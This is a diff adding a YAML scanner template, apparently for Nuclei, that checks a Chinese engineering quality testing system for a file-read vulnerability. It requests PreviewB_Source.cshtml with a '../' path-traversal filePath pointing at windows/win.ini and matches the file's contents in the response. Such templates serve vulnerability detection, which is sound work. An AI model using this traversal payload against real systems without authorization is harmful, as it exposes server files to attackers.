@@ -1,0 +1,21 @@
+id: poc-yaml-hunanjianyan-detection-system-previewb-source-fileread
+info:
+  name: 湖南建研工程质量检测系统 /Applications/Attachment/PreviewB_Source.cshtml 文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Applications/Attachment/PreviewB_Source.cshtml?filePath=../../../../../windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
